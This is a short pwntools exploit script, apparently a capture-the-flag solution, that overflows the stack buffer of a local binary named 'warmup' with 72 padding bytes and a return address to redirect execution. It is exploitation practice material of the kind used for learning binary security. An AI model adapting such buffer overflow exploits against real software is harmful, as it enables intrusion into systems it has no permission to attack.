#!/usr/bin/python3

from pwn import *

#target = gdb.debug('./warmup', '''
#b *0x4006a3
#''')
target = process('./warmup')

payload = b'A' * 72 
payload += p64(0x40060d)

print(target.recvuntil(b'>'))
target.sendline(payload)
print(target.recvline())
